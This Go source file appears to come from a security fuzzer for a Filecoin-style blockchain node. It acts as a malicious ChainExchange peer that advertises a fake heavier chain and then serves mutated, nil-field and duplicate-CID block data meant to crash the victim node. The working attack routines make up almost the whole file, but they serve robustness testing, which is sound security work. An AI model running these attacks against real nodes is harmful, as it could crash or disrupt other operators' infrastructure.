package main

import (
	"context"
	"io"
	"log"
	"time"

	"github.com/ipfs/go-cid"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
)

// ---------------------------------------------------------------------------
// ChainExchange Server Attacks
//
// Pattern: Fuzzer acts as a malicious ChainExchange server.
// 1. Create fresh host, register malicious exchange handler
// 2. Register minimal Hello handler (respond to victim's Hello)
// 3. Connect to target, send Hello claiming heavier chain
// 4. Victim calls FetchTipSet → opens ChainExchange to us
// 5. Our handler responds with mutated data → potential crash
// ---------------------------------------------------------------------------

type responseMutation struct {
	id      string
	builder func(baseOpts blockHeaderOpts) []byte
}

func getAllExchangeServerAttacks() []namedAttack {
	// Server-side attacks only — these hit paths WITHOUT recover().
	// Removed client-side multiblock mutations (nil-ticket, both-nil-tickets,
	// nil-electionproof) since they all hit the known recover() at
	// exchange/client.go:167.
	var result []namedAttack

	result = append(result,
		namedAttack{
			name: "poison-block-reuse",
			fn: func() {
				target := rngChoice(targets)
				runPoisonBlockReuse(ctx, target)
			},
		},
		namedAttack{
			name: "split-fetch-nil-secpk",
			fn: func() {
				target := rngChoice(targets)
				runSplitFetchNilSecpk(ctx, target)
			},
		},
		namedAttack{
			name: "random-nil-fields",
			fn: func() {
				target := rngChoice(targets)
				runRandomNilFields(ctx, target)
			},
		},
	)
	return result
}

// runExchangeServerAttack executes a single server-side attack.
func runExchangeServerAttack(ctx context.Context, target TargetNode, mut responseMutation) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		debugLog("[%s] cannot fetch chain head for %s, skipping", mut.id, target.Name)
		return
	}

	baseOpts := blockHeaderOpts{
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	}

	resp := mut.builder(baseOpts)
	triggerBlock := buildBlockHeaderCBOR(baseOpts)
	triggerCID := blockCIDFromCBOR(triggerBlock)

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[%s] create host failed: %v", mut.id, err)
		return
	}
	defer h.Close()

	served := make(chan struct{}, 1)

	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(resp)
		select {
		case served <- struct{}{}:
		default:
		}
	})

	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[%s] connect failed: %v", mut.id, err)
		return
	}

	genesis := parseGenesisCID()
	payload := buildHelloMessage(
		[]cid.Cid{triggerCID},
		headInfo.Height+1,
		999999999,
		genesis,
	)
	sendHelloPayload(ctx, h, target.AddrInfo.ID, payload)

	select {
	case <-served:
		debugLog("[%s] malicious response served to %s", mut.id, target.Name)
	case <-time.After(15 * time.Second):
		debugLog("[%s] timeout waiting for victim fetch from %s", mut.id, target.Name)
	}
}

func sendHelloPayload(ctx context.Context, h host.Host, targetPeer peer.ID, payload []byte) {
	streamCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	s, err := h.NewStream(streamCtx, targetPeer, helloProtocol)
	if err != nil {
		debugLog("[trigger-hello] stream open failed: %v", err)
		return
	}
	defer s.Close()

	s.Write(payload)
	s.CloseWrite()
	io.Copy(io.Discard, io.LimitReader(s, 1024))
}

// ---------------------------------------------------------------------------
// Response helpers
// ---------------------------------------------------------------------------

func mergeOpts(base blockHeaderOpts, mutation blockHeaderOpts) blockHeaderOpts {
	mutation.overrideParentCIDs = base.overrideParentCIDs
	mutation.overrideHeight = base.overrideHeight
	mutation.overrideWeight = base.overrideWeight
	return mutation
}

func okResponse(chain ...[]byte) []byte {
	return buildResponseCBOR(0, "", chain)
}

// buildMultiBlockMsgsCBOR builds CompactedMessages for a 2-block tipset.
func buildMultiBlockMsgsCBOR() []byte {
	return cborArray(
		cborArray(),
		cborArray(cborArray(), cborArray()),
		cborArray(),
		cborArray(cborArray(), cborArray()),
	)
}

// ---------------------------------------------------------------------------
// Two-phase attack: poison-block-reuse (server-side, no recover)
// ---------------------------------------------------------------------------

func runPoisonBlockReuse(ctx context.Context, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		debugLog("[poison-block-reuse] cannot fetch chain head for %s, skipping", target.Name)
		return
	}

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[poison-block-reuse] create host failed: %v", err)
		return
	}
	defer h.Close()

	poisonCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
		nilTicket:          true,
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	})
	poisonCID := blockCIDFromCBOR(poisonCBOR)

	served := make(chan struct{}, 1)

	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(okResponse(buildBSTipSetCBOR([][]byte{poisonCBOR}, buildEmptyCompactedMsgsCBOR())))
		select {
		case served <- struct{}{}:
		default:
		}
	})

	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[poison-block-reuse] connect failed: %v", err)
		return
	}

	genesis := parseGenesisCID()
	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
		[]cid.Cid{poisonCID}, headInfo.Height+1, 999999999, genesis,
	))

	select {
	case <-served:
		log.Printf("[poison-block-reuse] poison block planted on %s (height=%d, cid=%s)",
			target.Name, headInfo.Height+1, poisonCID.String()[:16])
	case <-time.After(15 * time.Second):
		debugLog("[poison-block-reuse] timeout planting on %s", target.Name)
		return
	}

	// Phase 2: trigger server-side NewTipSet with duplicate CIDs
	streamCtx, streamCancel := context.WithTimeout(ctx, 10*time.Second)
	defer streamCancel()
	s, err := h.NewStream(streamCtx, target.AddrInfo.ID, exchangeProtocol)
	if err != nil {
		debugLog("[poison-block-reuse] phase 2 stream failed: %v", err)
		return
	}
	defer s.Close()

	s.Write(buildExchangeRequest([]cid.Cid{poisonCID, poisonCID}, 1, 1))
	s.CloseWrite()
	s.SetReadDeadline(time.Now().Add(10 * time.Second))
	io.Copy(io.Discard, io.LimitReader(s, 64*1024))
}

// ---------------------------------------------------------------------------
// Split fetch: serve nil Secpk in messages-only response
// ---------------------------------------------------------------------------

func runSplitFetchNilSecpk(ctx context.Context, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		debugLog("[split-fetch-nil-secpk] cannot fetch chain head for %s, skipping", target.Name)
		return
	}

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[split-fetch-nil-secpk] create host failed: %v", err)
		return
	}
	defer h.Close()

	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	})
	blockCID := blockCIDFromCBOR(blockCBOR)

	served := make(chan struct{}, 1)

	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		reqData := make([]byte, 64*1024)
		n, _ := io.ReadAtLeast(s, reqData, 1)
		options := parseRequestOptions(reqData[:n])

		var resp []byte
		if options&1 != 0 {
			resp = okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, nil))
		} else if options&2 != 0 {
			resp = okResponse(buildBSTipSetCBOR(nil, buildNilSecpkCompactedMsgsCBOR()))
		} else {
			resp = okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, buildEmptyCompactedMsgsCBOR()))
		}

		s.Write(resp)
		select {
		case served <- struct{}{}:
		default:
		}
	})

	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[split-fetch-nil-secpk] connect failed: %v", err)
		return
	}

	genesis := parseGenesisCID()
	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
		[]cid.Cid{blockCID}, headInfo.Height+1, 999999999, genesis,
	))

	select {
	case <-served:
		debugLog("[split-fetch-nil-secpk] response served to %s", target.Name)
	case <-time.After(30 * time.Second):
		debugLog("[split-fetch-nil-secpk] timeout on %s", target.Name)
	}
}

// ---------------------------------------------------------------------------
// Random nil-field fuzzer (combinatorial search)
// ---------------------------------------------------------------------------

func runRandomNilFields(ctx context.Context, target TargetNode) {
	mut := responseMutation{
		id: "random-nil-fields",
		builder: func(base blockHeaderOpts) []byte {
			mutation := blockHeaderOpts{
				nilTicket:        rngIntn(2) == 0,
				nilElectionProof: rngIntn(2) == 0,
				nilBLSAggregate:  rngIntn(2) == 0,
				nilBlockSig:      rngIntn(2) == 0,
				nilBeaconEntries: rngIntn(2) == 0,
				nilParents:       rngIntn(3) == 0,
				emptyParents:     rngIntn(4) == 0,
			}

			numBlocks := 1
			if rngIntn(3) == 0 {
				numBlocks = 2
			}

			msgVariant := rngIntn(6)
			var blocks [][]byte
			var msgs []byte

			if numBlocks == 1 {
				opts := mergeOpts(base, mutation)
				if mutation.nilParents || mutation.emptyParents {
					opts.overrideParentCIDs = nil
				}
				blocks = [][]byte{buildBlockHeaderCBOR(opts)}
				switch msgVariant {
				case 0:
					msgs = buildEmptyCompactedMsgsCBOR()
				case 1:
					msgs = buildNilSecpkCompactedMsgsCBOR()
				case 2:
					msgs = buildNilBlsCompactedMsgsCBOR()
				case 3:
					msgs = buildOOBBlsIndexMsgsCBOR()
				case 4:
					msgs = buildOOBSecpkIndexMsgsCBOR()
				case 5:
					msgs = cborNil()
				}
			} else {
				optsA := mergeOpts(base, mutation)
				optsA.overrideMiner = []byte{0x00, 0xe8, 0x07}
				optsB := mergeOpts(base, blockHeaderOpts{
					nilTicket:        rngIntn(2) == 0,
					nilElectionProof: rngIntn(2) == 0,
					nilBLSAggregate:  rngIntn(2) == 0,
					nilBlockSig:      rngIntn(2) == 0,
					nilBeaconEntries: rngIntn(2) == 0,
					overrideMiner:    []byte{0x00, 0xe9, 0x07},
				})
				blocks = [][]byte{buildBlockHeaderCBOR(optsA), buildBlockHeaderCBOR(optsB)}
				msgs = buildMultiBlockMsgsCBOR()
			}

			return okResponse(buildBSTipSetCBOR(blocks, msgs))
		},
	}
	runExchangeServerAttack(ctx, target, mut)
}
